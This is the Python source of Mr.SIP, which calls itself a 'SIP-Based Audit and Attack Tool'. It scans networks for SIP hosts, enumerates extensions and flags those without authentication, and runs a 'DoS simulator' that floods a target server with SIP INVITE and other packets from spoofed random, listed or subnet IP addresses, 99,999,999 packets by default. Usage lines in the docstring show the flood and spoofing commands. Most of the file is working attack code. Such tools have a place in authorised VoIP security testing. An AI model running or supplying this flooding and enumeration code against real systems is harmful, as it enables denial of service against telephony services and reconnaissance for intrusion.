#!/usr/bin/python
# -*- coding: cp1254 -*-

"""_________________________________________
< Mr.SIP: SIP-Based Audit and Attack Tool! >
 -------------------------------------------
        \   ^__^
         \  (oo)\_______
            (__)\       )\/\
                ||----w |
                ||     ||

#####################################################################################################
        ################################   Installation   ################################ 
#####################################################################################################

# Install using pip:
# pip install netifaces
# pip install ipaddress
# pip install pyfiglet

# Install using apt:
# apt-get install python-scapy

#####################################################################################################
        ################################   Usages   ################################ 
#####################################################################################################

# SIP-NES usage:

# ./mr.sip.py --ns --tn <target_ip> --dp=<server_port>  
# ./mr.sip.py --ns --tn <target_network_range> --dp=<server_port>
# ./mr.sip.py --ns --tn <target_network_address> --dp=<server_port> 

# SIP-ENUM usage:

# ./mr.sip.py --se --dp=5060 --fu=fromUser.txt

SIP-DAS usage:

by using socket library (but doesn't support IP spoofing) \
./mr.sip.py --ds -dm=<sip_method_name> -c <number_of_packets> --di=<target_IP_address> --dp=5060 -r --to=toUser.txt --fu=fromUser.txt --ua=userAgent.txt --su=spUser.txt -l

by using scapy library (ip spoofing is supported) 
./mr.sip.py --ds -dm=invite -c <number_of_packets> --di=<target_IP_address> --dp=<server_port> -r --to=toUser.txt --fu=fromUser.txt --ua=userAgent.txt --su=spUser.txt 
./mr.sip.py --ds -dm=invite -c <number_of_packets> --di=<target_IP_address> --dp=<server_port> -s --to=toUser.txt --fu=fromUser.txt --ua=userAgent.txt --su=spUser.txt 
./mr.sip.py --ds -dm=invite -c <number_of_packets> --di=<target_IP_address> --dp=<server_port> -m --to=toUser.txt --fu=fromUser.txt --ua=userAgent.txt --su=spUser.txt --il=ip_list.txt 

#####################################################################################################
        ################################   Tips for SIPtrace  ################################ 
#####################################################################################################

# Tips for getting SIP trace:
# ngrep -W byline -d eth0 port 5060
# ngrep -W byline -d eth0 port 5060 -O capture_file
# ngrep -W byline -d eth0 INVITE
# tcpdump -i eth0 -n -s 0 port 5060
# tcpdump -i eth0 -n -s 0 port 5060 -vvv -w /home/capture_file_name
# tcpdump -nqt -s 0 -A -i en0 port 5060 

#####################################################################################################
        ################################   Authors   ################################ 
#####################################################################################################
"""

__author__ = "Melih Tas"
__copyright__ = "Copyrgiht 2019"
__credits__ = ["Caner", "Onur"]
__license__ = "GPL"
__version__ = "1.1.0"
__maintainer__ = "Melih Tas"
__status__ = "V2"     

"""
#####################################################################################################
        ################################   Importing Packages   ################################ 
#####################################################################################################
"""

import random,string,ipaddress,netifaces,os,socket,logging
from optparse import OptionParser, OptionGroup
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import conf, IP
import sip_packet, utilities
import pyfiglet

"""
#####################################################################################################
        ################################   Usage Options   ################################ 
#####################################################################################################
"""

usage = "usage: %prog [--ns|--ds|--se] [PARAMETERS]"
parser = OptionParser(usage=usage)
    
# SIP-NES: SIP-based Network Scanner 
parser.add_option("--ns", "--network-scanner", action="store_true", dest="network_scanner", default=False, help="Scan specified network for live connections.")
# SIP-ENUM: SIP-based Enumerator 
parser.add_option("--se", "--sip-enumerator", action="store_true", dest="sip_enumerator", default=False, help="Spoof IP addresses manually.")
# SIP-DAS: SIP-based DoS Attack Simulator 
parser.add_option("--ds", "--dos-simulator", action="store_true", dest="dos_simulator", default=False, help="Spoof IP addresses manually.")
    
group = OptionGroup(parser, "Parameters")
group.add_option("--tn", "--target-network", dest="target_network", help="Target network range to scan.")
group.add_option("-i", "--ip-save-list", dest="ip_list", default="ip_list.txt", help="Output file location to save live IP address.\n Default location is inside application folder ip_list.txt.")
group.add_option("--dm", "--dos-method", dest="dos_method", default="invite", help="DoS packet type selection. options, invite, register, sip-invite, subscribe, cancel, bye or other custom method file name.")
group.add_option("-c", "--count", type="int", dest="counter", default="99999999", help="Counter for how many messages to send. If not specified, default is flood.")
group.add_option("-l", "--lib", action="store_true", dest="library", default=False, help="Use Socket library (no spoofing), default is Scapy")
group.add_option("--di", "--destination-ip", dest="dest_ip", help="Destination SIP server IP address.")
group.add_option("--dp", "--destination-port", dest="dest_port", default=5060, help="Destination SIP server port number. Default is 5060.")
group.add_option("-r", "--random", action="store_true", dest="random", default=False, help="Spoof IP addresses randomly.")
group.add_option("-m", "--manual", action="store_true", dest="manual", default=False, help="Spoof IP addresses manually. If you choose manual IP usage, you have to specify a IP list via --manual-ip-list parameter.")
group.add_option("-s", "--subnet", action="store_true", dest="subnet", default=False, help="Spoof IP addresses from subnet.")
group.add_option("--to", "--to-user", dest="to_user", default="toUser.txt", help="To User list file location. Default is toUser.txt.")
group.add_option("--fu", "--from-user", dest="from_user", default="fromUser.txt", help="From User list file location. Default is fromUser.txt.")
group.add_option("--su", "--sp-user", dest="sp_user", default="spUser.txt", help="SP User list file location. Default is spUser.txt.")
group.add_option("--ua", "--user-agent", dest="user_agent", default="userAgent.txt", help="User Agent list file location. Default is userAgent.txt.")
group.add_option("--il", "--manual-ip-list", dest="manual_ip_list", help="IP list file location.")
parser.add_option_group(group)
    
(options, args) = parser.parse_args()

"""
#####################################################################################################
        ################################   Real Code   ################################ 
#####################################################################################################
"""

def main():
    
    # ascii_banner = pyfiglet.figlet_format("Mr.SIP: SIP-Based Audit and Attack Tool")
    # print(ascii_banner + "\033[1m\033[91m ~ By Melih Tas (SN)\n\033[0m") 

    banner = """
 __  __      ____ ___ ____      ____ ___ ____       _                        _ 
|  \/  |_ __/ ___|_ _|  _ \ _  / ___|_ _|  _ \     | |__   __ _ ___  ___  __| |
| |\/| | '__\___ \| || |_) (_) \___ \| || |_) |____| '_ \ / _` / __|/ _ \/ _` |
| |  | | | _ ___) | ||  __/ _   ___) | ||  __/_____| |_) | (_| \__ \  __/ (_| |
|_|  |_|_|(_)____/___|_|   (_) |____/___|_|        |_.__/ \__,_|___/\___|\__,_|
                                                                               
    _             _ _ _                     _      _   _   _             _    
   / \  _   _  __| (_) |_    __ _ _ __   __| |    / \ | |_| |_ __ _  ___| | __
  / _ \| | | |/ _` | | __|  / _` | '_ \ / _` |   / _ \| __| __/ _` |/ __| |/ /
 / ___ \ |_| | (_| | | |_  | (_| | | | | (_| |  / ___ \ |_| || (_| | (__|   < 
/_/   \_\__,_|\__,_|_|\__|  \__,_|_| |_|\__,_| /_/   \_\__|\__\__,_|\___|_|\_\\
                                                                              
 _____           _ 
|_   _|__   ___ | |
  | |/ _ \ / _ \| |
  | | (_) | (_) | |
  |_|\___/ \___/|_|+ \033[1m\033[91m ~ By Melih Tas (SN)\n\033[0m
    """ + "Greetz ~ \033[1m\033[94m Caner \033[1m\033[93m Onur \033[1m\033[95m Nesli \n\033[0m"
                   
    print (banner)
    
    if options.network_scanner:
        networkScanner()
    elif options.dos_simulator:
        dosSmilator()
    elif options.sip_enumerator:
        sipEnumerator()

# SIP-NES: SIP-based Network Scanner
def networkScanner():
    conf.verb = 0
    
    client_ip = netifaces.ifaddresses(conf.iface)[2][0]['addr']
    client_netmask = netifaces.ifaddresses(conf.iface)[2][0]['netmask']

    print ("\033[33m[!] Client Interface: {0}".format(str(conf.iface))) + "\033[0m"
    print ("\033[33m[!] Client IP: {0} ".format(str(client_ip))) + "\033[0m"
    
    print "\033[94m[!] Network scan process started for {0}".format(options.target_network) + "\033[0m"
    
    counter = 0
    if "-" in options.target_network:
       host_range = options.target_network.split("-")
       host = ipaddress.IPv4Address(unicode(host_range[0])) 
       last = ipaddress.IPv4Address(unicode(host_range[1]))  
       if ipaddress.IPv4Address(host) > ipaddress.IPv4Address(last):
          print "\033[1;31;40m Error: Second value must bigger than First value.\033[0m"
          exit(0)
       while ipaddress.IPv4Address(host) <= ipaddress.IPv4Address(last):
          sip = sip_packet.sip_packet("options", host, options.dest_port, client_ip, protocol="socket", wait=True)
          result = sip.generate_packet()
          if result["status"]: 
             if result["response"]['code'] == 200:
                printResult(result,str(host))
                counter += 1
          host = ipaddress.IPv4Address(host) + 1
    elif "/" in options.target_network:
       targetNetwork = ipaddress.IPv4Network(unicode(options.target_network), strict=False)
       for host in targetNetwork.hosts():
          print host
          
          sip = sip_packet.sip_packet("options", host, options.dest_port, client_ip, protocol="socket", wait=True)
          result = sip.generate_packet()
          if result["status"]: 
             if result["response"]['code'] == 200:
                printResult(result,str(host))
                counter += 1
    else:
       host =  options.target_network
       sip = sip_packet.sip_packet("options", host, options.dest_port, client_ip, protocol="socket", wait=True)
       result = sip.generate_packet()
       if result["status"]:
          if result["response"]['code'] == 200:
             printResult(result,host)      
             counter += 1
    print "\033[31m[!] Network scan process finished and {0} live IP address(s) found.".format(str(counter)) + "\033[0m"

def printResult(result,target):
    user_agent = ""
    for key, value in result["response"]['headers'].iteritems():
       if key == "user-agent":              
          user_agent = list(value)[0]

    if utilities.defineTargetType(user_agent) == "Server":
       print "\033[1;32m[+] New live IP found on " + target + ", It seems as a SIP Server.\033[0m"
       utilities.writeFile(options.ip_list, target + ";" + user_agent + ";SIP Server" + "\n")
    else :
       print "\033[1;32m[+] New live IP found on " + target + ", It seems as a SIP Client.\033[0m"
       utilities.writeFile(options.ip_list, target + ";" + user_agent + ";SIP Client" + "\n")

# SIP-ENUM: SIP-based Enumerator 
def sipEnumerator():
    conf.verb = 0
    
    client_ip = netifaces.ifaddresses(conf.iface)[2][0]['addr']
    client_netmask = netifaces.ifaddresses(conf.iface)[2][0]['netmask']

    print ("\033[33m[!] Client Interface: {0}".format(str(conf.iface))) + "\033[0m"
    print ("\033[33m[!] Client IP: {0} ".format(str(client_ip))) + "\033[0m"
    
    print "\033[94m[!] Enumeration process started. \033[0m"

    user_list = utilities.readFile(options.from_user)
    user_list = user_list.split("\n")
    if len(user_list) <= 1:
       print "\033[1;31;40m Error: From user not found. Please enter a valid From User list.\033[0m"
       exit(0)
    content = utilities.readFile("ip_list.txt")
    content = content.split(";")
    if len(content[0]) <= 1:
       print "\033[1;31;40m Error: Target IP not found. Please run SIP-NES first for detect the target IPs.\033[0m"
       exit(0)
    content = content[0].split(";")
    ext_counter = 0
    for user_id in user_list:
       
       sip = sip_packet.sip_packet("subscribe", content[0].strip(), options.dest_port, client_ip, from_user = user_id.strip(),to_user = user_id.strip(),protocol="socket", wait=True)
       result = sip.generate_packet()
       
       if result["status"]:
          if result["response"]['code'] == 200: 
             print "\033[1;32m[+] New SIP Extension Found : " + user_id + ",\033[0m \033[1;31mAuthentication not required!\033[0m"
             ext_counter = ext_counter + 1
          if result["response"]['code'] == 401:
             print "\033[1;32m[+] New SIP Extension Found : " + user_id + ", Authentication required.\033[0m"
             ext_counter = ext_counter + 1
    print "[!] " + str(ext_counter) + " SIP Extension Found."       
             
# SIP-DAS: SIP-based DoS Attack Simulator
def dosSmilator():
    conf.verb = 0
    
    client_ip = netifaces.ifaddresses(conf.iface)[2][0]['addr']
    client_netmask = netifaces.ifaddresses(conf.iface)[2][0]['netmask']
    
    print ("\033[33m[!] Client Interface: {0}".format(str(conf.iface))) + "\033[0m"
    print ("\033[33m[!] Client IP: {0} ".format(str(client_ip))) + "\033[0m"

    print "\033[94m[!] DoS attack simulation process started. \033[0m"
    
    utilities.promisc("on",conf.iface)

    i = 0
    while i < int(options.counter):
        try:
            
            toUser = random.choice([line.rstrip('\n') for line in open(options.to_user)])
            fromUser = random.choice([line.rstrip('\n') for line in open(options.from_user)])
            spUser = random.choice([line.rstrip('\n') for line in open(options.sp_user)])
            userAgent = random.choice([line.rstrip('\n') for line in open(options.user_agent)])
            
            pkt= IP(dst=options.dest_ip)
            client = pkt.src
            
            if options.random and not options.library:
                client = utilities.randomIPAddress()
            if options.manual and not options.library:
                client = random.choice([line.rstrip('\n') for line in open(options.manual_ip_list)])
            if options.subnet and not options.library:
                client = utilities.randomIPAddressFromNetwork(client_ip, client_netmask)
            send_protocol = "scapy"
            if options.library:
                send_protocol = "socket"
                
            sip = sip_packet.sip_packet(str(options.dos_method), str(options.dest_ip), str(options.dest_port), str(client), str(fromUser), str(toUser), str(userAgent), str(spUser), send_protocol)
            sip.generate_packet()
            i += 1
            utilities.printProgressBar(i,int(options.counter),"Progress: ")
        except (KeyboardInterrupt):
            utilities.promisc("off",conf.iface)
            print("Exiting traffic generation...")
            raise SystemExit
    
    print "\033[31m[!] DoS simulation finished and {0} packet sent to {1}...".format(str(i),str(options.dest_ip)) + "\033[0m"
    utilities.promisc("off",conf.iface)

if __name__ == "__main__":
    main()
    
